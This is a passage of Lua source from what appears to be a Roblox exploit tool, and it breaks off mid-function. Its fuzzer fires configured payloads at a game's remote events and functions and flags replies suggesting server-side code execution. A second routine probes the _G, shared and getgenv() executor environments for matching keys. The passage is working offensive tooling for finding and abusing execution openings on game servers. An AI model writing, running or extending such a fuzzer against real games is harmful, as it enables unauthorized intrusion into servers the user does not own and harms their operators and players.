local function runFuzzer()
    if S.isFuzzing then return end
    if #S.fuzzQueue == 0 then
        log("WARN","Fuzz queue is empty. Add remotes from Scanner first."); return
    end
    S.isFuzzing = true
    FuzzResultList:ClearAllChildren(); mkList(FuzzResultList, 3)
    log("FUZZ", ("Auto-Fuzzer started — %d remotes · mode: %s"):format(#S.fuzzQueue, currentFuzzMode))

    local payloads = CFG.FUZZ_SETS[currentFuzzMode] or CFG.FUZZ_SETS.QUICK

    for _, entry in ipairs(S.fuzzQueue) do
        if not S.isFuzzing then break end

        local remote = entry.inst
        if not remote or not remote.Parent then
            log("WARN","[FUZZ] Remote gone: "..entry.path)
        else
            log("FUZZ","Fuzzing: "..entry.path.." ("..entry.class..")")

            for _, payload in ipairs(payloads) do
                if not S.isFuzzing then break end
                task.wait(0.08)

                local ok, result, riskDelta = false, "", 0

                if remote:IsA("RemoteEvent") then
                    ok, result = pcall(function() remote:FireServer(payload); return "Fired" end)
                elseif remote:IsA("RemoteFunction") then
                    ok, result = pcall(function() return tostring(remote:InvokeServer(payload)) end)
                end

                result = tostring(result)

                if result:find("SS%-FUZZ") or result:find("loadstring") or result:find("executed") then
                    riskDelta = 35
                    log("CRIT","[FUZZ] !! Possible execution response from "..entry.path..": "..result:sub(1,80))
                elseif ok and result ~= "Fired" and result ~= "nil" then
                    riskDelta = 8
                end

                entry.fuzzRisk = math.max(entry.fuzzRisk or 0, riskDelta)
                entry.risk = calcRemoteRisk(entry)

                S.fuzzResults[#S.fuzzResults+1] = {path=entry.path, payload=payload, ok=ok, response=result, riskDelta=riskDelta}
                addFuzzResult(entry.path, payload, ok, result, riskDelta)
                log("FUZZ",("[%s] %s → %s"):format(ok and "OK" or "FAIL", entry.path, result:sub(1,60)))
            end
        end
    end

    updateStats()
    log("OK",("Fuzzer done — %d results logged"):format(#S.fuzzResults))
    S.isFuzzing = false
end

local function probeGBridge()
    S.gbridgeFinds = {}
    GBridgeList:ClearAllChildren(); mkList(GBridgeList, 2)
    log("FUZZ","G-Bridge probe starting…")

    local sources = { {name="_G", tbl=_G}, {name="shared", tbl=shared} }
    local ok, genv = pcall(function() return getgenv and getgenv() or nil end)
    if ok and type(genv)=="table" then sources[#sources+1]={name="getgenv()", tbl=genv} end

    local found = 0
    for _, src in ipairs(sources) do
        if type(src.tbl) == "table" then
            for k, v in pairs(src.tbl) do
                local ks = tostring(k):lower()
                for _, bk in ipairs(CFG.GBRIDGE_KEYS) do
                    if ks == bk or ks:find(bk, 1, true) then
                        found += 1
                        local entry = {key=src.name.."."..tostring(k), valType=type(v)}
                        S.gbridgeFinds[#S.gbridgeFinds+1] = entry

                        local row = Instance.new("Frame")
                        row.Size = UDim2.new(1,-8,0,22)
                        row.BackgroundColor3 = Color3.fromRGB(25,10,40)
                        row.BorderSizePixel = 0
                        row.Parent = GBridgeList
                        mkCorner(row, 3); mkStroke(row, T.PRP, 1)
                        local gl = mkLbl(row, ("[%s] %s = %s"):format(src.name, tostring(k), type(v)), 11, T.PRP, Enum.Font.Code)
                        gl.Size = UDim2.new(1,-8,1,0); gl.Position = UDim2.new(0,4,0,0)
                        log("CRIT","[GBRIDGE] "..src.name.."."..tostring(k).." = "..type(v))
                        break
                    end
                end
            end
        end
    end

    statLabels["gbridge"].Text = tostring(found)
    if found == 0 then
        local row = Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,22); row.BackgroundColor3=T.BG3; row.BorderSizePixel=0; row.Parent=GBridgeList; mkCorner(row,3)
